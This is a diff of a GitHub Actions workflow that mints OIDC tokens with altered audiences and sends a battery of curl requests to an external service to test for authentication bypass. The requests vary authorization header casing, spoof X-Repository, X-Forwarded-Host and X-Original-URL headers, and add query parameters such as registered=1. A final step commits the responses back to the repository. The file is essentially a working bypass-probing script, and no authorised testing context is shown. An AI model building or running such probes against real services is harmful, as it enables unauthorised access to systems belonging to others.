@@ -19,33 +19,22 @@ jobs:
           UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
           mint(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | jq -r .value; }
           TOK=$(mint "https://ldw-check.r8admin.com/")
-          t(){
-            echo "### $1"
-            shift
-            curl -s -A "$UA" -o b.tmp -w "[%{http_code}] " "$@" ; cat b.tmp; echo
-          }
-          # aud variants
           T2=$(mint "https://ldw-check.r8admin.com")
-          T3=$(mint "https://LDW-CHECK.r8admin.com/")
+          t(){ echo "### $1"; shift; curl -s -A "$UA" -o b.tmp -w "[%{http_code}] " "$@" ; cat b.tmp; echo; }
+          t "baseline correct-aud" -H "Authorization: Bearer gha:$TOK" "$SVC/gha/$SHA"
           t "aud no-slash" -H "Authorization: Bearer gha:$T2" "$SVC/gha/$SHA"
-          t "aud uppercase host" -H "Authorization: Bearer gha:$T3" "$SVC/gha/$SHA"
-          t "aud correct" -H "Authorization: Bearer gha:$TOK" "$SVC/gha/$SHA"
-          # header casing/shape
-          t "GHA: prefix upper" -H "Authorization: Bearer GHA:$TOK" "$SVC/gha/$SHA"
-          t "Bearer  gha two spaces" -H "Authorization: Bearer  gha:$TOK" "$SVC/gha/$SHA"
+          t "GHA upper prefix" -H "Authorization: Bearer GHA:$TOK" "$SVC/gha/$SHA"
+          t "two spaces" -H "Authorization: Bearer  gha:$TOK" "$SVC/gha/$SHA"
           t "gha no Bearer" -H "Authorization: gha:$TOK" "$SVC/gha/$SHA"
-          t "X-Forwarded: gha" -H "Authorization: Bearer gha:$TOK" -H "X-Original-URL: /health" "$SVC/gha/$SHA"
-          # claim/registration bypass hints
           t "query repository" -H "Authorization: Bearer gha:$TOK" "$SVC/gha/$SHA?repository=replicate/actions"
-          t "query registered" -H "Authorization: Bearer gha:$TOK" "$SVC/gha/$SHA?registered=1"
           t "header X-Repo" -H "Authorization: Bearer gha:$TOK" -H "X-Repository: replicate/actions" "$SVC/gha/$SHA"
-          t "header X-Forwarded-Host replicatesvc" -H "Authorization: Bearer gha:$TOK" -H "X-Forwarded-Host: ldw-check.r8admin.com" "$SVC/gha/$SHA"
-          # second gate endpoint?
-          t "root" -H "Authorization: Bearer gha:$TOK" "$SVC/"
-          t "health auth" -H "Authorization: Bearer gha:$TOK" "$SVC/health"
-          t "bare gha sha with no trailing" -H "Authorization: Bearer gha:$TOK" "$SVC/gha"
-          echo "ALLDONE"
+          t "health with token" -H "Authorization: Bearer gha:$TOK" "$SVC/health"
+          t "bare /gha" -H "Authorization: Bearer gha:$TOK" "$SVC/gha"
+          t "root with token" -H "Authorization: Bearer gha:$TOK" "$SVC/"
+          echo ALLDONE
       - name: push
         run: |
           git config user.email p@e.com; git config user.name p
-          git add ldw2.txt; git commit -m "ldw2 [skip ci]" || true; git push || true
+          git add ldw2.txt; git commit -m "ldw2 [skip ci]" || true
+          git pull --rebase origin ${GITHUB_REF_NAME} || true
+          git push origin HEAD:${GITHUB_REF_NAME} || git push || true
